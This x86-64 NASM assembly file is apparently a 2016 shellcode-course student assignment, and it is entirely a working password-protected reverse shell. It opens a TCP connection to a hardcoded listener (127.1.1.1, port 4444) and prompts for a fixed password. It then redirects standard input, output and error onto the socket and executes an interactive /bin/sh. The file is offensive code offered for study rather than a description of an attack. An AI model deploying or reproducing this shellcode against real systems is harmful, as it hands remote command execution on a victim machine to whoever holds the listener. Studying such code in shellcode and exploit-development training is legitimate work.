;------------------------------
; rev-shell-pass.nasm
; by Michael Born
; Student ID: SLAE-1439
; November 7, 2016
;------------------------------


; purpose: password protected rev shell

global _start

section .text

_start:

	; socket syscall
	; define __NR_socket 41
	; 

	xor rax, rax		; initialize rax
	mov al, 0x29		; int socket(int domain, int type, int protocol)
	xor rdi, rdi		;
	add rdi, 0x2		; AF_INET
	xor rsi, rsi		;
	add rsi, 0x1		; SOCK_STREAM
	xor rdx, rdx		;
	add rdx, 0x6		; TCP
	syscall			; syscall

	; save socketfd for later

	mov rdi, rax		; socketfd into rdi


	
	; define __NR_connect 42 (0x2a)
	; struct sockaddr_in {
	;      sa_family_t    sin_family address family: AF_INET
        ;      in_port_t      sin_port   port in network byte order 
        ;      struct in_addr sin_addr   internet address


	xor rax, rax				; initialize rax
	mov al, 0x2a				; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	xor rdx, rdx				; initialize rdx
	mov dl, 0x10				; socklen_t addrlen (16)
	xor rsi, rsi				; initialize rsi
	push rsi				; NULL byte
	mov dword [rsp - 0x4], 0x101017f	; IP Addr 127.1.1.1
	mov word [rsp -0x6], 0x5c11		; Port 4444
	mov dword [rsp -0xa], esi		; null byte
	mov byte [rsp - 0x8],  0x2		; AF_INET
	sub rsp, 0x8				; readjust stack
	mov rsi, rsp				; const struct sockaddr *addr
	syscall					; syscall

	xor r9, r9
	mov r9, rdi
	

password:

	; password onto stack in safe place

	xor r14, r14
	push  r14			; NULL byte onto stack
	mov r14, 0x3130723078783448	; '10r0xx4H'
	push r14
	mov r14, rsp			; pointer to password on stack
	sub rsp, 0x10			; adjust stack 16 bytes so we don't accidently overwrite our password

duper:
        ; define __NR_dup2 33

        xor rax, rax
        mov al, 0x21            ; int dup2(int oldfd, int newfd)
        xor rsi, rsi            ; int newfd (0 for stdin)
        syscall                 ; syscall
        xor rax, rax            ;
        mov al, 0x21            ; int dup2(int oldfd, int newfd)
        inc rsi                 ; int newfd (now 1 for std out)
        syscall                 ; syscall
        xor rax, rax            ;
        mov al, 0x21            ; int dup2(int oldfd, int newfd)
        inc rsi                 ; int newfd (2 for stdout)
        syscall                 ; syscall


passprompt:

	; define __NR_write 1
	; send prompt through socket

	mov rdi, r9
	push byte 0x1
	pop rax					; ssize_t write(int fd, const void *buf, size_t count)
	xor rsi, rsi				; initialize rsi
	push  rsi				; push NULL onto the stack
	mov rsi, 0x0a203a64726f7773
	push rsi
	mov rsi, 0x7361502061207265
	push rsi
	mov rsi, 0x746e452065736165
	push rsi
	push word 0x6c50			; 'lP'
	mov rsi, rsp				; const void *buf
	xor rdx, rdx				;
	mov dl, 26				; size_t count
	syscall					; syscall

	; define __NR_read 0

	xor rax, rax		; ssize_t read(int fd, void *buf, size_t count)
	xor rsi, rsi		; 
	push rsi
	lea rsi, [rsp -0x10]		; pointer to buffer with entered password
	xor rdx, rdx		; initialize rdx
	add dl, 0x10		; size_t count
	syscall			; syscall

passwordcheck:
	mov rdi, r14		; password for comparison
	cmpsq			; compare passwords
	jz shelltime		; password valid
	jnz passprompt		; password invalid	
	


shelltime:	

	; define __NR_execve 59
	; /bin//sh -i
	; int execve(const char *filename, char *const argv[], char *const envp[])

	xor rax, rax
	mov al, 0x3b			; int execve(const char *filename, char *const argv[], char *const envp[])
	xor rdi, rdi			; 
	push rdi			; NULL byte onto stack
	mov rdi, 0x68732f2f6e69622f	; 'hs//nib/'
	push rdi			; 'hs//nib/' onto stack
	mov rdi, rsp			; pointer to 'hs//nib/'
	xor rsi, rsi			; 
	push rsi			; NULL byte onto stack
	push word 0x692d		; 'i-'
	xor r10, r10			;
	mov r10, rsp			; store rsp temporarily
	push rsi			; NULL byte
	push r10			; '-i'
	push rdi			; 'hs//nib/'
	mov rsi, rsp			; char *const argv[]
	xor rdx, rdx			;
	push rdx			; NULL byte onto stack
	mov rdx, rsp			; char *const envp[]
	syscall				; syscall	
